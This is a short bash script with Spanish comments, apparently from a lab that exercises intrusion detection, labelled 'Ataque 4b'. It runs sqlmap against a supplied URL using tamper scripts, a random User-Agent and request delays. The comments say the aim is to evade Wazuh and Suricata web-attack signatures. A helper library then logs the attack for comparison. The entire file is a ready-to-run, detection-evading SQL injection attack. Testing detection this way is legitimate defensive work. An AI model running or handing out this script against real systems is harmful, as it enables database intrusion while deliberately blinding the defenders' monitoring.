#!/usr/bin/env bash
# Ataque 4b (SIGILOSO): Inyeccion SQL con tecnicas de evasion (MITRE T1190)
# A diferencia del SQLi ruidoso (sqlmap default, patrones obvios), aqui se usan
# scripts de ofuscacion ("tamper"), User-Agent aleatorio y retardo entre
# peticiones para evadir las firmas de deteccion de ataques web de Wazuh y las
# reglas de Suricata. Tecnica de evasion real.
# Uso: ./attack4b_sqli_evasion.sh <URL>
set -uo pipefail
source "$(dirname "$0")/../_lib_log_ataque.sh"
TARGET="${1:?Uso: $0 <URL>}"

INICIO=$(log_inicio)
echo "[+] SQLi con EVASION contra ${TARGET} (tamper + user-agent aleatorio + retardo)..."
# --tamper: ofusca el payload (espacios->comentarios, codificacion);
# --random-agent: rota el User-Agent; --delay: separa peticiones;
# --level/-risk bajos para ser menos agresivo; batch no interactivo.
sqlmap -u "${TARGET}" --batch \
  --tamper=space2comment,charencode,randomcase \
  --random-agent --delay=2 --level=1 --risk=1 --technique=B \
  --timeout=10 --retries=1 &>/tmp/sqli_evasion_$(date +%s).log || true
log_fin "sqli_evasion" "T1190" "${TARGET}" "${INICIO}" "1"
echo "[+] Ataque sigiloso registrado en log_ataques.csv"
